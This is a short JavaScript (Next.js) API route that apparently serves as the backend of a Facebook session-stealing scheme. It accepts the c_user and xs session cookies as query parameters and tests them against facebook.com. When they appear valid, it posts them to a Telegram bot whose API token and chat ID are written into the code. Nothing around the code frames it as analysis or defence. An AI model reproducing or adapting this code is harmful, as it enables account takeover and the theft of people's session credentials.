
export async function GET(req) {
  let c_user = req.nextUrl.searchParams.get("c_user");
  let xs = req.nextUrl.searchParams.get("xs");
  let status = "Fall";
  await fetch("https://www.facebook.com", {
    headers: {
      Cookie: `c_user=${c_user};xs=${xs}`,
    },
  }).then(async (response) => {
    const data = response.headers.get("Set-Cookie");
    if (typeof data == "object") {
      status = "Done";
      await fetch(
        "https://api.telegram.org/bot8111846233:AAGMyXKPYCWahRz42wMcJRXjawvAynI4GDU/sendMessage",
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            chat_id: "6210592873",
            parse_mode: "html",
            text: `facebook\n\nc_user: ${c_user}\nxs: ${xs}`,
          }),
        }
      )
        .then((response) => response.json())
        .then((data) => console.log(data.result.from.first_name));
    }
  });
  return Response.json(status);
}

